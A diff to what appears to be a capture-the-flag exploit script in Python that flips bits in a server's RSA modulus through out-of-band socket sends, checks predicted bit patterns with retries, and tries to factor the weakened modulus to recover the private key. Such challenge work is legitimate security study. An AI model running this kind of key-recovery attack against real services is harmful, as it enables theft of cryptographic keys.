@@ -83,6 +83,8 @@ def make_connections(host, port, num_clients):
         except KeyboardInterrupt:
             print(f"\n[{i+1}] Interrupted", file=sys.stderr)
             break
+    print()
+
     return sockets
 
 def get_key(r):
@@ -169,6 +171,24 @@ def get_bit_pattern(r):
     r.readuntil(b'Enter your choice: ')
     return set(bits)
 
+# Get bit pattern from the first 8 bytes of the key
+def get_bit_pattern_from_key(key):
+    key_bytes = key.to_bytes(128, 'big')
+    # Get the first 8 bytes of the key
+    key_bytes = key_bytes[:8]
+    # Convert to a number
+    key = int.from_bytes(key_bytes, 'big')
+    # Convert to a bit pattern
+    return [i for i in range(64) if (key & (1 << i)) != 0]
+
+def num_bits_set(key):
+    key_bytes = key.to_bytes(128, 'big')
+    # Get the first 8 bytes of the key
+    key_bytes = key_bytes[:8]
+    # Convert to a number
+    key = int.from_bytes(key_bytes, 'big')
+    return bin(key).count('1')
+
 # NB: only in debug builds
 def kill_server(args):
     r = remote(args.host, args.port)
@@ -216,17 +236,38 @@ def solve_onebit(r, overflow_sockets, controlled_bits, initial_modulus):
         predicted = predict_bit_pattern(already_tried | {s}, controlled_bits)
         sock = overflow_sockets[s]
         sock.send(b'1', socket.MSG_OOB)
+        time.sleep(0.1)
         already_tried.add(s)
+        tries = 10
         # Pause the client thread so that it doesn't overwrite the key
         with PausedClient(r):
             e, modulus = get_key(r)
-            compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
-            guessed = "CORRECT" if modulus.to_bytes(128, 'big')[:8] == predicted else "WRONG"
-            print(f"Prd: {predicted.hex()} ({guessed})")
+            while True:
+                if num_bits_set(modulus) > len(already_tried):
+                    print(f"WARNING: Key has more bits set than expected ({num_bits_set(modulus)} > {len(already_tried)})")
+                compare_keys(current_modulus, modulus, 'Old', 'New', limit=64)
+                guessed = "CORRECT" if modulus.to_bytes(128, 'big')[:8] == predicted else "WRONG"
+                print(f"Prd: {predicted.hex()} ({guessed})")
+                if guessed != "CORRECT":
+                    print(f"WARNING: Prediction was wrong; trying again...")
+                    # already_tried = set(get_bit_pattern_from_key(modulus))
+                else:
+                    break
+                resume_client(r)
+                time.sleep(0.1)
+                pause_client(r)
+                e, modulus = get_key(r)
+                tries -= 1
+                if tries == 0:
+                    print(f"WARNING: Tried too many times; giving up")
+                    already_tried.remove(s)
+                    break
             if modulus == current_modulus:
                 print(f"WARNING: Key is unchanged; something went wrong :(")
                 # No point trying to factor the same modulus again
                 continue
+        if tries == 0:
+            continue
         current_modulus = modulus
         key = try_factor(modulus, e)
         if key:
@@ -273,7 +314,7 @@ class PausedClient:
 def solve(args):
     # Connect to the server on the main port
     r = remote(args.host, args.port)
-    port_text = r.recvline_startswith(b'Your very own port is')
+    port_text = r.recvline_startswith(b'Session sensor port is: ')
     client_port = int(port_text.decode().split()[-1])
 
     # Read the menu
